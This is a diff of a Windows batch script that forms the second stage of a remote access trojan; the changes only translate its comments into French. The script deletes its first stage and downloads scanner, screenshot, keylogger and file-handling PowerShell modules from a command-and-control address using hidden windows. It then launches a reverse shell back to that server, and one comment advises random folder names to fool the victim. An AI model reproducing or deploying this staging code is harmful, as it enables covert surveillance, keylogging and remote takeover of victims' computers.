@@ -1,4 +1,4 @@
-@REM second stage of RAT
+@REM Deuxième phase du RAT
 
 @REM variables
 set "PATH_PHASE1=%1"
@@ -8,20 +8,20 @@ set "MODULES_PATH=http://10.0.0.212:8000/modules"
 set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
 set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 bridge.ps1"
 
-@REM Remove phase1
+@REM Supprimer la phase initiale
 del %PATH_PHASE1%
 
-@REM create folders to store our modules (it is ideal to give a random directory name to fool the victim)
+@REM Créer un dossier ou on va mettre nos modules (Dans un contexte réel il serait mieux de donner des noms aléatoires)
 cd %TEMP_PATH%
 mkdir modules
 cd modules
 
-@REM download modules from our local web server
+@REM télécharger les modules à partir du C&C
 (for %%m in (%modulesName%) do (
    powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %MODULES_PATH%/%%m -Outfile %%m"
 ))
 
 TIMEOUT /T 10
 
-@REM create a reverse shell connection back to our command and control center (powershell received from powercat module on github)
+@REM Créer un « reverse shell » vers notre C&C
 powershell -WindowStyle Hidden -c ".\bridge.ps1"
